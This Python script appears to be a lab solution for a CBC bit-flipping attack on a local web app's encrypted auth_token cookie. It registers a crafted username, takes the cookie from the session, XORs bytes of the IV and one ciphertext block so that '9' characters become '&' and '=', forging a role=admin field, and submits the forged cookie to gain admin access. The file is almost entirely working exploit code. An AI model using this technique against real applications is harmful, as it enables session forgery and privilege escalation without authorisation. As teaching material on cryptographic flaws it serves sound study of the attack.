from Crypto.Cipher import AES
import crypto
import base64
import requests
import re
import crypto
import lab2


def cut_cookie(cookie_string):
	print(cookie_string)
	match = re.search(r'auth_token=([0-9a-f]+)', cookie_string)
	if match:
		hex_encoded_cookie = match.group(1)
		print(hex_encoded_cookie)
		return hex_encoded_cookie
	else:
		print("No hex encoded cookie found.")


def cbc_cookie_attack():
	s = requests.Session()
	# username long enough so block ends with role=, to append another block to
	first_data = {
		"user": '12349uid9090123456789012345xxxx9role9admin1',
		"password": '123',
		"Register": ''
	}
	# register user
	s.post("http://localhost:8080/register", data=first_data)
	first_data = {
		"user": '12349uid9090123456789012345xxxx9role9admin1',
		# [IV][user=12349uid909][0123456789012345][xxxx9role9admin1][&uid=1&role=user]
		"password": '123',
		"Login": ''
	}
	# login as user
	r = s.post("http://localhost:8080", data=first_data)
	print(r.content)
	# get cookie
	# m[0]  end with &, m[2] start with &
	cookie = str(s.cookies)
	# extract cookie from whole  cookie string
	cookie = cut_cookie(cookie)
	cookie = bytes.fromhex(cookie)
	iv = bytearray(cookie[:16])
	m0 = bytearray(cookie[16:32])
	m1 = bytearray(cookie[32:48])
	m2 = bytearray(cookie[48:64])
	nine_to_and = ord('9') ^ ord('&')
	nine_to_eq = ord('9') ^ ord('=')
	# IV: 9 th to &  13th to =, 15th to &,  2nd block: 4th to & 9th to =, 15th to 0x01
	iv[9] ^= nine_to_and
	iv[13] ^= nine_to_eq
	iv[15] ^= nine_to_and
	m1[4] ^= nine_to_and
	m1[9] ^= nine_to_eq
	m1[15] ^= 0b110000
	cookie = iv + m0 + m1 + m2
	cookie = cookie.hex()
	final_cookie = {
		"auth_token": cookie
	}
	# submit my manipulated cookie
	r = s.get("http://localhost:8080/home", cookies=final_cookie)
	print(r.content)


# 4 char username, 9 uid 9 block of whatever, x's padding at beginning,  9 role admin1
# 12349uid9x012345678901234 xxxx9role9admin1
# flip the 9's, flip

def main():
	cbc_cookie_attack()


if __name__ == "__main__":
	main()